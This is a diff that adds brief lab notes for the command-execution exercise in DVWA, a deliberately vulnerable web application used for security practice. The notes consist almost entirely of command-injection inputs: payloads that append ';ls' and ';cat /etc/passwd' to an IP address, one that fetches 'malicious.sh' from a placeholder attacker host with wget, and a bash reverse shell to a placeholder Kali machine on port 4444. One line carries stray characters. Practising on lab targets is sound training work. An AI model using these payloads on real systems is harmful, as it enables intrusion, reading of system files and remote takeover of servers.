@@ -1,0 +1,7 @@
+go to dvwa
+command execution
+
+ 192.168.47.92;ls 
+192.168.47.92; ; cat /etc/passwd
+Q qq192.168.47.92; wget http://<attacker-ip>/malicious.sh   
+192.168.47.92; bash -i >& /dev/tcp/<kali-ip>/4444 0>&1  
